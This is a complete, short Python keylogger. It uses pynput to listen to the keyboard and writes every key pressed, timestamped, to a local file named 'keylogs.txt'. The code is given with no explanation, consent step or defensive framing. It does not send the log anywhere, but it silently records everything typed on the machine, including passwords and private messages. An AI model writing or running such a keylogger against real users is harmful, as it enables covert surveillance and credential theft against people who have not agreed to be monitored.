from pynput.keyboard import Key, Listener
import logging
from pynput import keyboard

log_dir_keys = ""

logging.basicConfig(filename=(log_dir_keys + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with keyboard.Listener(on_press=on_press) as klistener:
    klistener.join()